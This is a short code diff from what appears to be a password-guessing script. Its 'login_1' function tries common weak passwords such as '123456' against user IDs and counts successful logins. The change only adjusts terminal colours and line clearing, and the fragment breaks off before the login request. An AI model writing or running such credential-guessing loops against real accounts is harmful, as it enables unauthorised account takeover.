@@ -437,11 +437,12 @@ def login_1(uid):
     session = requests.session()
     try:    
         for pw in ('123456', '1234567', '12345678', '123456789'):
+            sys.stdout.write("\x1b[2K\r")
             sys.stdout.write(
                 f"\x1b[2K\r"  
                 f"\x1b[38;5;220m🌟PARADISE🌟 "
                 f"\x1b[38;5;45m({loop}) "
-                f"\x1b[38;5;220m(OK: {len(oks)})"
+                f"\x1b[38;5;220m(OK: \x1b[38;5;45m{len(oks)}\x1b[38;5;220m)"
             )
             sys.stdout.flush()     
             data = {
